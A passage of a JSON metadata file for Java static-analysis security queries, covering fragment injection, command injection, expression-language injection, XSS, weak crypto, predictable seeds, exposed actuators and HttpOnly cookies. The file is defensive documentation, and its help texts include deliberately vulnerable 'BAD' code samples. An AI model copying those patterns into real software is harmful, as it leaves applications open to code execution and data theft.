    "help": "# Android fragment injection\nWhen fragments are instantiated with externally provided names, this exposes any exported activity that dynamically creates and hosts the fragment to fragment injection. A malicious application could provide the name of an arbitrary fragment, even one not designed to be externally accessible, and inject it into the activity. This can bypass access controls and expose the application to unintended effects.\n\nFragments are reusable parts of an Android application's user interface. Even though a fragment controls its own lifecycle and layout, and handles its input events, it cannot exist on its own: it must be hosted either by an activity or another fragment. This means that, normally, a fragment will be accessible by third-party applications (that is, exported) only if its hosting activity is itself exported.\n\n\n## Recommendation\nIn general, do not instantiate classes (including fragments) with user-provided names unless the name has been properly validated. Also, if an exported activity is extending the `PreferenceActivity` class, make sure that the `isValidFragment` method is overriden and only returns `true` when the provided `fragmentName` points to an intended fragment.\n\n\n## Example\nThe following example shows two cases: in the first one, untrusted data is used to instantiate and add a fragment to an activity, while in the second one, a fragment is safely added with a static name.\n\n\n```java\npublic class MyActivity extends FragmentActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstance) {\n        try {\n            super.onCreate(savedInstance);\n            // BAD: Fragment instantiated from user input without validation\n            {\n                String fName = getIntent().getStringExtra(\"fragmentName\");\n                getFragmentManager().beginTransaction().replace(com.android.internal.R.id.prefs,\n                        Fragment.instantiate(this, fName, null)).commit();\n            }\n            // GOOD: Fragment instantiated statically\n            {\n                getFragmentManager().beginTransaction()\n                        .replace(com.android.internal.R.id.prefs, new MyFragment()).commit();\n            }\n        } catch (Exception e) {\n        }\n    }\n\n}\n\n```\nThe next example shows two activities that extend `PreferenceActivity`. The first activity overrides `isValidFragment`, but it wrongly returns `true` unconditionally. The second activity correctly overrides `isValidFragment` so that it only returns `true` when `fragmentName` is a trusted fragment name.\n\n\n```java\nclass UnsafeActivity extends PreferenceActivity {\n\n    @Override\n    protected boolean isValidFragment(String fragmentName) {\n        // BAD: any Fragment name can be provided.\n        return true;\n    }\n}\n\n\nclass SafeActivity extends PreferenceActivity {\n    @Override\n    protected boolean isValidFragment(String fragmentName) {\n        // Good: only trusted Fragment names are allowed.\n        return SafeFragment1.class.getName().equals(fragmentName)\n                || SafeFragment2.class.getName().equals(fragmentName)\n                || SafeFragment3.class.getName().equals(fragmentName);\n    }\n\n}\n\n\n```\n\n## References\n* Google Help: [How to fix Fragment Injection vulnerability](https://support.google.com/faqs/answer/7188427?hl=en).\n* IBM Security Systems: [Android collapses into Fragments](https://securityintelligence.com/wp-content/uploads/2013/12/android-collapses-into-fragments.pdf).\n* Android Developers: [Fragments](https://developer.android.com/guide/fragments)\n* Common Weakness Enumeration: [CWE-470](https://cwe.mitre.org/data/definitions/470.html).\n"
  },
  "java/potentially-dangerous-function": {
    "name": "Use of a potentially dangerous function",
    "description": "Certain standard library routines are dangerous to call.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 10.0,
    "precision": "medium",
    "id": "java/potentially-dangerous-function",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-676"
    ],
    "filename": "8a8c4e9a-PotentiallyDangerousFunction",
    "language": "java",
    "help": "# Use of a potentially dangerous function\nThis rule finds calls to methods that are dangerous to use. Currently, it checks for calls to `Thread.stop`.\n\nStopping a thread with `Thread.stop` causes it to receive a `ThreadDeath` exception. That exception propagates up the stack, releasing all monitors that the thread was holding. In some cases the relevant code will be protected by catching the `ThreadDeath` exception and cleaning up, but because the exception can potentially be thrown from so very many locations, it is impractical to catch all such cases. As a result, calling `Thread.stop` is likely to result in corrupt data.\n\n\n## Recommendation\nThe best solution is usually to provide an alternate communication mechanism for the thread that might need to be interrupted early. For example, Oracle gives the following example of using a volatile variable to communicate whether the worker thread should exit:\n\n\n```java\nprivate volatile Thread blinker;\n\npublic void stop() {\n    blinker = null;\n}\n\npublic void run() {\n    Thread thisThread = Thread.currentThread();\n    while (blinker == thisThread) {\n        try {\n            Thread.sleep(interval);\n        } catch (InterruptedException e){\n        }\n        repaint();\n    }\n}\n\n```\nIt is also possible to use `Thread.interrupt` and to catch and handle `InterruptedException` when it occurs. However, it can be difficult to handle an `InterruptedException` everywhere it might occur; for example, the sample code above simply discards the exception rather than actually exiting the thread.\n\nAnother strategy is to use message passing, for example via a `BlockingQueue`. In addition to passing the worker thread its ordinary work via such a message queue, the worker can be asked to exit by a particular kind of message being sent on the queue.\n\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [THI05-J. Do not use Thread.stop() to terminate threads](https://wiki.sei.cmu.edu/confluence/display/java/THI05-J.+Do+not+use+Thread.stop()+to+terminate+threads).\n* Java API Specification: [Java Thread Primitive Deprecation](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/doc-files/threadPrimitiveDeprecation.html).\n* Java API Specification: [Thread.interrupt](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/Thread.html#interrupt()), [BlockingQueue](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/concurrent/BlockingQueue.html).\n* Common Weakness Enumeration: [CWE-676](https://cwe.mitre.org/data/definitions/676.html).\n"
  },
  "java/potentially-weak-cryptographic-algorithm": {
    "name": "Use of a potentially broken or risky cryptographic algorithm",
    "description": "Using broken or weak cryptographic algorithms can allow an attacker to compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/potentially-weak-cryptographic-algorithm",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-328"
    ],
    "filename": "b74be4da-MaybeBrokenCryptoAlgorithm",
    "language": "java",
    "help": "# Use of a potentially broken or risky cryptographic algorithm\nUsing broken or weak cryptographic algorithms can leave data vulnerable to being decrypted.\n\nMany cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that an attacker may be able to easily decrypt the encrypted data.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048. Do not use the ECB encryption mode since it is vulnerable to replay and other attacks.\n\n\n## Example\nThe following code shows an example of using a java `Cipher` to encrypt some data. When creating a `Cipher` instance, you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a strong modern algorithm.\n\n\n```java\n// BAD: DES is a weak algorithm \nCipher des = Cipher.getInstance(\"DES\");\ncipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);\n\nbyte[] encrypted = cipher.doFinal(input.getBytes(\"UTF-8\"));\n\n// ...\n\n// GOOD: AES is a strong algorithm\nCipher aes = Cipher.getInstance(\"AES\");\n\n// ...\n\n```\n\n## References\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).\n"
  },
  "java/command-line-injection-extra": {
    "name": "Command Injection into Runtime.exec() with dangerous command",
    "description": "High sensitvity and precision version of java/command-line-injection, designed to find more cases of command injection in rare cases that the default query does not find",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/command-line-injection-extra",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-078"
    ],
    "filename": "f0ce0668-CommandInjectionRuntimeExec",
    "language": "java",
    "help": "# Command Injection into Runtime.exec() with dangerous command\nCode that passes remote user input to an arugment of a call of `Runtime.exec` that executes a scripting executable will allow the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command or script to run, or library to load. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable libraries or commands cannot be determined at compile time, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows code that takes a shell script that can be changed maliciously by a user, and passes it straight to the array going into `Runtime.exec` without examining it first.\n\n\n```java\nclass Test {\n    public static void main(String[] args) {\n        String script = System.getenv(\"SCRIPTNAME\");\n        if (script != null) {\n            // BAD: The script to be executed by /bin/sh is controlled by the user.\n            Runtime.getRuntime().exec(new String[]{\"/bin/sh\", script});\n        }\n    }\n}\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* SEI CERT Oracle Coding Standard for Java: [IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method](https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec()+method).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n"
  },
  "java/jexl-expression-injection": {
    "name": "Expression language injection (JEXL)",
    "description": "Evaluation of a user-controlled JEXL expression may lead to arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/jexl-expression-injection",
    "tags": [
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "b76141d8-JexlInjection",
    "language": "java",
    "help": "# Expression language injection (JEXL)\nJava EXpression Language (JEXL) is a simple expression language provided by the Apache Commons JEXL library. The syntax is close to a mix of ECMAScript and shell-script. The language allows invocation of methods available in the JVM. If a JEXL expression is built using attacker-controlled data, and then evaluated, then it may allow the attacker to run arbitrary code.\n\n\n## Recommendation\nIt is generally recommended to avoid using untrusted input in a JEXL expression. If it is not possible, JEXL expressions should be run in a sandbox that allows accessing only explicitly allowed classes.\n\n\n## Example\nThe following example uses untrusted data to build and run a JEXL expression.\n\n\n```java\npublic void evaluate(Socket socket) throws IOException {\n  try (BufferedReader reader = new BufferedReader(\n        new InputStreamReader(socket.getInputStream()))) {\n    \n    String input = reader.readLine();\n    JexlEngine jexl = new JexlBuilder().create();\n    JexlExpression expression = jexl.createExpression(input);\n    JexlContext context = new MapContext();\n    expression.evaluate(context);\n  }\n}\n```\nThe next example shows how an untrusted JEXL expression can be run in a sandbox that allows accessing only methods in the `java.lang.Math` class. The sandbox is implemented using `JexlSandbox` class that is provided by Apache Commons JEXL 3.\n\n\n```java\npublic void evaluate(Socket socket) throws IOException {\n  try (BufferedReader reader = new BufferedReader(\n        new InputStreamReader(socket.getInputStream()))) {\n    \n    JexlSandbox onlyMath = new JexlSandbox(false);\n    onlyMath.white(\"java.lang.Math\");\n    JexlEngine jexl = new JexlBuilder().sandbox(onlyMath).create();\n      \n    String input = reader.readLine();\n    JexlExpression expression = jexl.createExpression(input);\n    JexlContext context = new MapContext();\n    expression.evaluate(context);\n  }\n}\n```\nThe next example shows another way how a sandbox can be implemented. It uses a custom implementation of `JexlUberspect` that checks if callees are instances of allowed classes.\n\n\n```java\npublic void evaluate(Socket socket) throws IOException {\n  try (BufferedReader reader = new BufferedReader(\n        new InputStreamReader(socket.getInputStream()))) {\n    \n    JexlUberspect sandbox = new JexlUberspectSandbox();\n    JexlEngine jexl = new JexlBuilder().uberspect(sandbox).create();\n      \n    String input = reader.readLine();\n    JexlExpression expression = jexl.createExpression(input);\n    JexlContext context = new MapContext();\n    expression.evaluate(context);\n  }\n\n  private static class JexlUberspectSandbox implements JexlUberspect {\n\n    private static final List<String> ALLOWED_CLASSES =\n              Arrays.asList(\"java.lang.Math\", \"java.util.Random\");\n\n    private final JexlUberspect uberspect = new JexlBuilder().create().getUberspect();\n\n    private void checkAccess(Object obj) {\n      if (!ALLOWED_CLASSES.contains(obj.getClass().getCanonicalName())) {\n        throw new AccessControlException(\"Not allowed\");\n      }\n    }\n\n    @Override\n    public JexlMethod getMethod(Object obj, String method, Object... args) {\n      checkAccess(obj);\n      return uberspect.getMethod(obj, method, args);\n    }\n\n    @Override\n    public List<PropertyResolver> getResolvers(JexlOperator op, Object obj) {\n      checkAccess(obj);\n      return uberspect.getResolvers(op, obj);\n    }\n\n    @Override\n    public void setClassLoader(ClassLoader loader) {\n      uberspect.setClassLoader(loader);\n    }\n\n    @Override\n    public int getVersion() {\n      return uberspect.getVersion();\n    }\n\n    @Override\n    public JexlMethod getConstructor(Object obj, Object... args) {\n      checkAccess(obj);\n      return uberspect.getConstructor(obj, args);\n    }\n\n    @Override\n    public JexlPropertyGet getPropertyGet(Object obj, Object identifier) {\n      checkAccess(obj);\n      return uberspect.getPropertyGet(obj, identifier);\n    }\n\n    @Override\n    public JexlPropertyGet getPropertyGet(List<PropertyResolver> resolvers, Object obj, Object identifier) {\n      checkAccess(obj);\n      return uberspect.getPropertyGet(resolvers, obj, identifier);\n    }\n\n    @Override\n    public JexlPropertySet getPropertySet(Object obj, Object identifier, Object arg) {\n      checkAccess(obj);\n      return uberspect.getPropertySet(obj, identifier, arg);\n    }\n\n    @Override\n    public JexlPropertySet getPropertySet(List<PropertyResolver> resolvers, Object obj, Object identifier, Object arg) {\n      checkAccess(obj);\n      return uberspect.getPropertySet(resolvers, obj, identifier, arg);\n    }\n\n    @Override\n    public Iterator<?> getIterator(Object obj) {\n      checkAccess(obj);\n      return uberspect.getIterator(obj);\n    }\n\n    @Override\n    public JexlArithmetic.Uberspect getArithmetic(JexlArithmetic arithmetic) {\n      return uberspect.getArithmetic(arithmetic);\n    } \n  }\n}\n```\n\n## References\n* Apache Commons JEXL: [Project page](https://commons.apache.org/proper/commons-jexl/).\n* Apache Commons JEXL documentation: [JEXL 2.1.1 API](https://commons.apache.org/proper/commons-jexl/javadocs/apidocs-2.1.1/).\n* Apache Commons JEXL documentation: [JEXL 3.1 API](https://commons.apache.org/proper/commons-jexl/apidocs/index.html).\n* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/predictable-seed": {
    "name": "Use of a predictable seed in a secure random number generator",
    "description": "Using a predictable seed in a pseudo-random number generator can lead to predictability of the numbers generated by it.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/predictable-seed",
    "tags": [
      "security",
      "external/cwe/cwe-335",
      "external/cwe/cwe-337"
    ],
    "filename": "306b5a73-PredictableSeed",
    "language": "java",
    "help": "# Use of a predictable seed in a secure random number generator\nUsing a predictable seed in a pseudo-random number generator can lead to predictability of the numbers generated by it.\n\n\n## Recommendation\nIf the predictability of the pseudo-random number generator does not matter then consider using the faster `Random` class from `java.util`. If it is important that the pseudo-random number generator produces completely unpredictable values then either let the generator securely seed itself by not specifying a seed or specify a randomly generated, unpredictable seed.\n\n\n## Example\nIn the first example shown here, a constant value is used as a seed. Depending on the implementation of ` SecureRandom`, this could lead to the same random number being generated each time the code is executed.\n\nIn the second example shown here, the system time is used as a seed. Depending on the implementation of ` SecureRandom`, if an attacker knows what time the code was run, they could predict the generated random number.\n\nIn the third example shown here, the random number generator is allowed to generate its own seed, which it will do in a secure way.\n\n\n```java\nSecureRandom prng = new SecureRandom();\nint randomData = 0;\n\n// BAD: Using a constant value as a seed for a random number generator means all numbers it generates are predictable.\nprng.setSeed(12345L);\nrandomData = prng.next(32);\n\n// BAD: System.currentTimeMillis() returns the system time which is predictable.\nprng.setSeed(System.currentTimeMillis());\nrandomData = prng.next(32);\n\n// GOOD: SecureRandom implementations seed themselves securely by default.\nprng = new SecureRandom();\nrandomData = prng.next(32);\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-335](https://cwe.mitre.org/data/definitions/335.html).\n* Common Weakness Enumeration: [CWE-337](https://cwe.mitre.org/data/definitions/337.html).\n"
  },
  "java/spring-boot-exposed-actuators": {
    "name": "Exposed Spring Boot actuators",
    "description": "Exposing Spring Boot actuators may lead to internal application's information leak or even to remote code execution.",
    "kind": "problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/spring-boot-exposed-actuators",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-16"
    ],
    "filename": "c663f2ea-SpringBootActuators",
    "language": "java",
    "help": "# Exposed Spring Boot actuators\nSpring Boot includes a number of additional features called actuators that let you monitor and interact with your web application. Exposing unprotected actuator endpoints via JXM or HTTP can, however, lead to information disclosure or even to remote code execution vulnerability.\n\n\n## Recommendation\nSince actuator endpoints may contain sensitive information, careful consideration should be given about when to expose them. You should take care to secure exposed HTTP endpoints in the same way that you would any other sensitive URL. If Spring Security is present, endpoints are secured by default using Spring Security\u2019s content-negotiation strategy. If you wish to configure custom security for HTTP endpoints, for example, only allow users with a certain role to access them, Spring Boot provides some convenient `RequestMatcher` objects that can be used in combination with Spring Security.\n\n\n## Example\nIn the first example, the custom security configuration allows unauthenticated access to all actuator endpoints. This may lead to sensitive information disclosure and should be avoided.\n\nIn the second example, only users with `ENDPOINT_ADMIN` role are allowed to access the actuator endpoints.\n\n\n```java\n@Configuration(proxyBeanMethods = false)\npublic class SpringBootActuators extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    // BAD: Unauthenticated access to Spring Boot actuator endpoints is allowed\n    http.requestMatcher(EndpointRequest.toAnyEndpoint()).authorizeRequests((requests) ->\n        requests.anyRequest().permitAll());\n  }\n}\n\n@Configuration(proxyBeanMethods = false)\npublic class ActuatorSecurity extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    // GOOD: only users with ENDPOINT_ADMIN role are allowed to access the actuator endpoints\n    http.requestMatcher(EndpointRequest.toAnyEndpoint()).authorizeRequests((requests) ->\n        requests.anyRequest().hasRole(\"ENDPOINT_ADMIN\"));\n    http.httpBasic();\n  }\n}\n```\n\n## References\n* Spring Boot documentation: [Actuators](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html).\n* [Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)\n* Common Weakness Enumeration: [CWE-16](https://cwe.mitre.org/data/definitions/16.html).\n"
  },
  "java/spel-expression-injection": {
    "name": "Expression language injection (Spring)",
    "description": "Evaluation of a user-controlled Spring Expression Language (SpEL) expression may lead to remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/spel-expression-injection",
    "tags": [
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "b76141d8-SpelInjection",
    "language": "java",
    "help": "# Expression language injection (Spring)\nThe Spring Expression Language (SpEL) is a powerful expression language provided by the Spring Framework. The language offers many features including invocation of methods available in the JVM. If a SpEL expression is built using attacker-controlled data, and then evaluated in a powerful context, then it may allow the attacker to run arbitrary code.\n\nThe `SpelExpressionParser` class parses a SpEL expression string and returns an `Expression` instance that can be then evaluated by calling one of its methods. By default, an expression is evaluated in a powerful `StandardEvaluationContext` that allows the expression to access other methods available in the JVM.\n\n\n## Recommendation\nIn general, including user input in a SpEL expression should be avoided. If user input must be included in the expression, it should be then evaluated in a limited context that doesn't allow arbitrary method invocation.\n\n\n## Example\nThe following example uses untrusted data to build a SpEL expression and then runs it in the default powerful context.\n\n\n```java\npublic Object evaluate(Socket socket) throws IOException {\n  try (BufferedReader reader = new BufferedReader(\n      new InputStreamReader(socket.getInputStream()))) {\n\n    String string = reader.readLine();\n    ExpressionParser parser = new SpelExpressionParser();\n    Expression expression = parser.parseExpression(string);\n    return expression.getValue();\n  }\n}\n```\nThe next example shows how an untrusted SpEL expression can be run in `SimpleEvaluationContext` that doesn't allow accessing arbitrary methods. However, it's recommended to avoid using untrusted input in SpEL expressions.\n\n\n```java\npublic Object evaluate(Socket socket) throws IOException {\n  try (BufferedReader reader = new BufferedReader(\n      new InputStreamReader(socket.getInputStream()))) {\n\n    String string = reader.readLine();\n    ExpressionParser parser = new SpelExpressionParser();\n    Expression expression = parser.parseExpression(string);\n    SimpleEvaluationContext context \n        = SimpleEvaluationContext.forReadWriteDataBinding().build();\n    return expression.getValue(context);\n  }\n}\n```\n\n## References\n* Spring Framework Reference Documentation: [Spring Expression Language (SpEL)](https://docs.spring.io/spring/docs/4.2.x/spring-framework-reference/html/expressions.html).\n* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/mvel-expression-injection": {
    "name": "Expression language injection (MVEL)",
    "description": "Evaluation of a user-controlled MVEL expression may lead to remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/mvel-expression-injection",
    "tags": [
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "b76141d8-MvelInjection",
    "language": "java",
    "help": "# Expression language injection (MVEL)\nMVEL is an expression language based on Java-syntax, which offers many features including invocation of methods available in the JVM. If a MVEL expression is built using attacker-controlled data, and then evaluated, then it may allow attackers to run arbitrary code.\n\n\n## Recommendation\nIncluding user input in a MVEL expression should be avoided.\n\n\n## Example\nIn the following sample, the first example uses untrusted data to build a MVEL expression and then runs it in the default context. In the second example, the untrusted data is validated with a custom method that checks that the expression does not contain unexpected code before evaluating it.\n\n\n```java\npublic void evaluate(Socket socket) throws IOException {\n  try (BufferedReader reader = new BufferedReader(\n    new InputStreamReader(socket.getInputStream()))) {\n  \n    String expression = reader.readLine();\n    // BAD: the user-provided expression is directly evaluated\n    MVEL.eval(expression);\n  }\n}\n\npublic void safeEvaluate(Socket socket) throws IOException {\n  try (BufferedReader reader = new BufferedReader(\n    new InputStreamReader(socket.getInputStream()))) {\n  \n    String expression = reader.readLine();\n    // GOOD: the user-provided expression is validated before evaluation\n    validateExpression(expression);\n    MVEL.eval(expression);\n  }\n}\n\nprivate void validateExpression(String expression) {\n  // Validate that the expression does not contain unexpected code.\n  // For instance, this can be done with allow-lists or deny-lists of code patterns.\n}\n```\n\n## References\n* MVEL Documentation: [Language Guide for 2.0](http://mvel.documentnode.com/).\n* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/xss": {
    "name": "Cross-site scripting",
    "description": "Writing user input directly to a web page allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "java/xss",
    "tags": [
      "security",
      "external/cwe/cwe-079"
    ],
    "filename": "918405f7-XSS",
    "language": "java",
    "help": "# Cross-site scripting\nDirectly writing user input (for example, an HTTP request parameter) to a web page, without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the reference.\n\n\n## Example\nThe following example shows the `page` parameter being written directly to the page, leaving the website vulnerable to cross-site scripting.\n\n\n```java\npublic class XSS extends HttpServlet {\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException {\n\t\t// BAD: a request parameter is written directly to the Servlet response stream\n\t\tresponse.getWriter().print(\n\t\t\t\t\"The page \\\"\" + request.getParameter(\"page\") + \"\\\" was not found.\");\n\n\t}\n}\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n"
  },
  "java/weak-cryptographic-algorithm": {
    "name": "Use of a broken or risky cryptographic algorithm",
    "description": "Using broken or weak cryptographic algorithms can allow an attacker to compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/weak-cryptographic-algorithm",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-328"
    ],
    "filename": "b74be4da-BrokenCryptoAlgorithm",
    "language": "java",
    "help": "# Use of a broken or risky cryptographic algorithm\nUsing broken or weak cryptographic algorithms can leave data vulnerable to being decrypted.\n\nMany cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that an attacker may be able to easily decrypt the encrypted data.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048. Do not use the ECB encryption mode since it is vulnerable to replay and other attacks.\n\n\n## Example\nThe following code shows an example of using a java `Cipher` to encrypt some data. When creating a `Cipher` instance, you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a strong modern algorithm.\n\n\n```java\n// BAD: DES is a weak algorithm \nCipher des = Cipher.getInstance(\"DES\");\ncipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);\n\nbyte[] encrypted = cipher.doFinal(input.getBytes(\"UTF-8\"));\n\n// ...\n\n// GOOD: AES is a strong algorithm\nCipher aes = Cipher.getInstance(\"AES\");\n\n// ...\n\n```\n\n## References\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).\n"
  },
  "java/sensitive-cookie-not-httponly": {
    "name": "Sensitive cookies without the HttpOnly response header set",
    "description": "Sensitive cookies without the 'HttpOnly' flag set leaves session cookies vulnerable to an XSS attack.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/sensitive-cookie-not-httponly",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-1004"
    ],
    "filename": "351c0644-SensitiveCookieNotHttpOnly",
    "language": "java",
    "help": "# Sensitive cookies without the HttpOnly response header set\nCross-Site Scripting (XSS) is categorized as one of the OWASP Top 10 Security Vulnerabilities. The `HttpOnly` flag directs compatible browsers to prevent client-side script from accessing cookies. Including the `HttpOnly` flag in the Set-Cookie HTTP response header for a sensitive cookie helps mitigate the risk associated with XSS where an attacker's script code attempts to read the contents of a cookie and exfiltrate information obtained.\n\n\n## Recommendation\nUse the `HttpOnly` flag when generating a cookie containing sensitive information to help mitigate the risk of client side script accessing the protected cookie.\n\n\n## Example\nThe following example shows two ways of generating sensitive cookies. In the 'BAD' cases, the `HttpOnly` flag is not set. In the 'GOOD' cases, the `HttpOnly` flag is set.\n\n\n```java\nclass SensitiveCookieNotHttpOnly {\n    // GOOD - Create a sensitive cookie with the `HttpOnly` flag set.\n    public void addCookie(String jwt_token, HttpServletRequest request, HttpServletResponse response) {\n        Cookie jwtCookie =new Cookie(\"jwt_token\", jwt_token);\n        jwtCookie.setPath(\"/\");\n        jwtCookie.setMaxAge(3600*24*7);\n        jwtCookie.setHttpOnly(true);\n        response.addCookie(jwtCookie);\n    }\n\n    // BAD - Create a sensitive cookie without the `HttpOnly` flag set.\n    public void addCookie2(String jwt_token, String userId, HttpServletRequest request, HttpServletResponse response) {\n        Cookie jwtCookie =new Cookie(\"jwt_token\", jwt_token);\n        jwtCookie.setPath(\"/\");\n        jwtCookie.setMaxAge(3600*24*7);\n        response.addCookie(jwtCookie);\n    }\n\n    // GOOD - Set a sensitive cookie header with the `HttpOnly` flag set.\n    public void addCookie3(String authId, HttpServletRequest request, HttpServletResponse response) {\n        response.addHeader(\"Set-Cookie\", \"token=\" +authId + \";HttpOnly;Secure\");\n    }\n\n    // BAD - Set a sensitive cookie header without the `HttpOnly` flag set.\n    public void addCookie4(String authId, HttpServletRequest request, HttpServletResponse response) {\n        response.addHeader(\"Set-Cookie\", \"token=\" +authId + \";Secure\");\n    }\n    \n    // GOOD - Set a sensitive cookie header using the class `javax.ws.rs.core.Cookie` with the `HttpOnly` flag set through string concatenation.\n    public void addCookie5(String accessKey, HttpServletRequest request, HttpServletResponse response) {\n        response.setHeader(\"Set-Cookie\", new NewCookie(\"session-access-key\", accessKey, \"/\", null, null, 0, true) + \";HttpOnly\");\n    }\n\n    // BAD - Set a sensitive cookie header using the class `javax.ws.rs.core.Cookie` without the `HttpOnly` flag set.\n    public void addCookie6(String accessKey, HttpServletRequest request, HttpServletResponse response) {\n        response.setHeader(\"Set-Cookie\", new NewCookie(\"session-access-key\", accessKey, \"/\", null, null, 0, true).toString());\n    }\n\n    // GOOD - Set a sensitive cookie header using the class `javax.ws.rs.core.Cookie` with the `HttpOnly` flag set through the constructor.\n    public void addCookie7(String accessKey, HttpServletRequest request, HttpServletResponse response) {\n        NewCookie accessKeyCookie = new NewCookie(\"session-access-key\", accessKey, \"/\", null, null, 0, true, true);\n        response.setHeader(\"Set-Cookie\", accessKeyCookie.toString());\n    }\n}\n\n```\n\n## References\n* PortSwigger: [Cookie without HttpOnly flag set](https://portswigger.net/kb/issues/00500600_cookie-without-httponly-flag-set)\n* OWASP: [HttpOnly](https://owasp.org/www-community/HttpOnly)\n* Common Weakness Enumeration: [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html).\n"
  },
  "java/tainted-numeric-cast": {
    "name": "User-controlled data in numeric cast",
    "description": "Casting user-controlled numeric data to a narrower type without validation can cause unexpected truncation.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.0,
    "precision": "high",
    "id": "java/tainted-numeric-cast",
    "tags": [
      "security",
      "external/cwe/cwe-197",
      "external/cwe/cwe-681"
    ],
    "filename": "01e4a75b-NumericCastTainted",
    "language": "java",
